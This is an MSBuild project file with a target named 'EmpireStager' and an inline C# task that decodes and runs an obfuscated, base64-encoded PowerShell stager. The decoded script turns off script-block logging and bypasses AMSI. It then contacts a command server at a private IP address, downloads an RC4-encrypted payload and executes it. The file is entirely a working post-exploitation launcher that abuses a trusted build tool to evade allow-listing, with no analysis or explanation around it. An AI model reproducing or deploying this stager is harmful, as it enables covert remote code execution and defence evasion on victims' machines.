<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target Name="EmpireStager"><ClassExample /></Target><UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" ><Task><Reference Include="System.Management.Automation" /><Using Namespace="System" /><Using Namespace="System.IO" /><Using Namespace="System.Reflection" /><Using Namespace="System.Collections.Generic" /><Code Type="Class" Language="cs"><![CDATA[ using System;using System.IO;using System.Diagnostics;using System.Reflection;using System.Runtime.InteropServices;using System.Collections.ObjectModel;using System.Management.Automation;using System.Management.Automation.Runspaces;using System.Text;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class ClassExample :  Task, ITask{public override bool Execute(){byte[] data = Convert.FromBase64String("SQBmACgAJABQAFMAVgBFAFIAUwBpAE8AbgBUAGEAQgBMAGUALgBQAFMAVgBFAHIAcwBJAE8AbgAuAE0AYQBqAE8AcgAgAC0ARwBFACAAMwApAHsAJABiAGYAMwAxAD0AWwByAGUARgBdAC4AQQBTAFMAZQBNAGIAbAB5AC4ARwBlAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBFAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEIARgAzADEAKQB7ACQAMAAxADkAZgA9ACQAQgBmADMAMQAuAEcARQBUAFYAQQBsAFUARQAoACQAbgBVAGwAbAApADsASQBmACgAJAAwADEAOQBmAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMAAxADkARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAwADEAOQBmAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBMAGwAZQBjAFQAaQBPAG4AUwAuAEcARQBuAEUAUgBJAGMALgBEAEkAQwBUAEkATwBuAGEAUgB5AFsAUwBUAHIAaQBOAEcALABTAFkAcwB0AEUAbQAuAE8AYgBqAGUAYwB0AF0AXQA6ADoATgBlAHcAKAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADAAMQA5AEYAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAGwAfQBFAGwAcwBFAHsAWwBTAGMAUgBpAHAAVABCAEwAbwBDAGsAXQAuACIARwBFAHQARgBJAGUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBMAFUAZQAoACQATgBVAGwAbAAsACgATgBFAHcALQBPAGIASgBFAEMAVAAgAEMATwBsAEwARQBjAFQAaQBvAE4AUwAuAEcAZQBOAGUAUgBJAGMALgBIAGEAcwBoAFMAZQBUAFsAUwB0AFIAaQBuAEcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMARQBNAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAdABGAGkAZQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwB5AHMAVABFAE0ALgBOAGUAVAAuAFMARQBSAFYAaQBDAEUAUABvAEkAbgB0AE0AQQBuAEEAZwBFAFIAXQA6ADoARQBYAFAARQBjAFQAMQAwADAAQwBPAE4AVABpAG4AdQBFAD0AMAA7ACQAMQAxADMARQA9AE4ARQB3AC0ATwBiAGoARQBDAHQAIABTAFkAcwBUAEUAbQAuAE4AZQBUAC4AVwBFAEIAQwBMAEkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AYwBPAEQAaQBuAEcAXQA6ADoAVQBuAEkAYwBPAGQARQAuAEcAZQBUAFMAVABSAGkAbgBnACgAWwBDAE8ATgBWAEUAcgBUAF0AOgA6AEYAcgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAawBBAE0AZwBBAHUAQQBEAEUAQQBOAGcAQQA0AEEAQwA0AEEATwBBAEEANABBAEMANABBAE0AUQBBADAAQQBEAEUAQQBPAGcAQQA0AEEARABBAEEATQBBAEEAeABBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAAxADEAMwBFAC4ASABlAGEAZABFAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAMQAxADMARQAuAFAAcgBvAFgAeQA9AFsAUwBZAHMAdABFAG0ALgBOAGUAdAAuAFcAZQBCAFIARQBRAFUARQBTAHQAXQA6ADoARABFAEYAYQB1AGwAdABXAGUAYgBQAFIAbwBYAFkAOwAkADEAMQAzAGUALgBQAHIATwBYAFkALgBDAHIARQBEAGUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAFkAUwBUAGUAbQAuAE4AZQBUAC4AQwBSAEUARABlAG4AVABJAGEAbABDAEEAYwBoAGUAXQA6ADoARABFAEYAQQB1AGwAVABOAGUAVABXAG8AcgBLAEMAUgBFAGQAZQBuAFQASQBBAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAAxADEAMwBlAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAFkAUwBUAGUATQAuAFQARQB4AFQALgBFAE4AQwBvAGQAaQBOAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQARQBzACgAJwAxAGEAMQBkAGMAOQAxAGMAOQAwADcAMwAyADUAYwA2ADkAMgA3ADEAZABkAGYAMABjADkANAA0AGIAYwA3ADIAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAAxADEAMwBFAC4ASABlAGEARABlAFIAcwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBZAGUAbgBUAGsAVwBOAHUAWQBWAGQAegBwAEwAagBpAD0AcwBrAEgAYQBTAEYATQBNAEkARQBaAFEAaQBJAHkAMABjAEYAZwBqADMAOAA5AHcAYQBIAFkAPQAiACkAOwAkAGQAQQB0AEEAPQAkADEAMQAzAEUALgBEAE8AVwBOAGwAbwBBAEQARABhAFQAQQAoACQAcwBlAHIAKwAkAHQAKQA7ACQASQB2AD0AJABEAGEAdABBAFsAMAAuAC4AMwBdADsAJABkAEEAVABBAD0AJABEAEEAdABhAFsANAAuAC4AJABEAEEAVABBAC4ATABlAE4ARwB0AEgAXQA7AC0ASgBvAEkAbgBbAEMAaABhAHIAWwBdAF0AKAAmACAAJABSACAAJABkAEEAVABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=");string script = Encoding.Unicode.GetString(data);PSExecute(script);return true;}public static void PSExecute(string cmd){Runspace runspace = RunspaceFactory.CreateRunspace();runspace.Open();Pipeline pipeline = runspace.CreatePipeline();pipeline.Commands.AddScript(cmd);pipeline.InvokeAsync();}} ]]></Code></Task></UsingTask></Project>